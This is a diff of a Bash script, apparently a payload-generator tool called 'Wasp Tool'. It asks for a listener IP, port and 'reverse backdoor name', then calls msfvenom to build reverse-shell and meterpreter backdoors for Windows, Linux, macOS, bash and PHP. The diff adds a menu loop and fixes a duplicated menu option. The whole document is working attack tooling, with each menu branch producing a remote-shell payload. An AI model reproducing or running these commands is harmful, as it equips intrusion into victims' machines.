@@ -22,8 +22,8 @@ __      ____ _ ___ _ __
                   |_|    
 EOF
 echo
-echo -e "\e[1;31m:::::::Wasps Nest Tool v.0 2017:::::::.\e[0m"
-echo "                                              c0ded by 0xline."
+echo -e "\e[1;31m:::::::Wasp Tool v.1 2017:::::::.\e[0m"
+
 echo -e "\e[1;31mPlease enter Your Ip:\e[0m"
 read lip
 echo -e "\e[1;31mPlease enter reverse Port:\e[0m"
@@ -31,6 +31,8 @@ read lport
 echo -e "\e[1;31mPlease enter reverse backdoor name:\e[0m"
 read bkname
 mkdir -p /usr/share/wasp/payloads
+while :
+do
 echo
 echo -e "\e[1;32m1. Payload Windows[$bkname.Exe] .\e[0m"
 echo -e "\e[1;32m2. Payload Linux Binaries[$bkname.Elf] .\e[0m"
@@ -45,9 +47,9 @@ echo -e "\e[1;32m10. main.\e[0m"
 echo -e "\e[1;32m11. Exit.\e[0m"
 echo
 echo -e "\e[1;36m1. Choice.\e[0m"
-read choice
+read -n3
 echo $choice
-case $choice in
+case "$REPLY" in
      1) msfvenom -p windows/meterpreter/reverse_tcp LHOST=$lip LPORT=$lport -f exe > /usr/share/wasp/payloads/$bkname.exe ;;
      2) msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=$lip LPORT=$lport -f elf > /usr/share/wasp/payloads/$bkname.elf ;;
      3) msfvenom -p osx/x86/shell_reverse_tcp LHOST=$lip LPORT=$lport -f macho > /usr/share/wasp/payloads/$bkname.macho ;;
@@ -58,6 +60,8 @@ case $choice in
      8) msfvenom -p cmd/unix/reverse_bash LHOST=$lip LPORT=$lport -f raw > /usr/share/wasp/payloads/$bkname.sh ;;
      9) msfvenom -p php/meterpreter_reverse_tcp LHOST=$lip LPORT=$lport -f raw > payloads/$bkname.php ;;
      10) wasp ;;
-     10) exit ;;
+     11) exit ;;
      *) echo; echo "Invalid choice."; echo
 esac
+sleep 1
+done
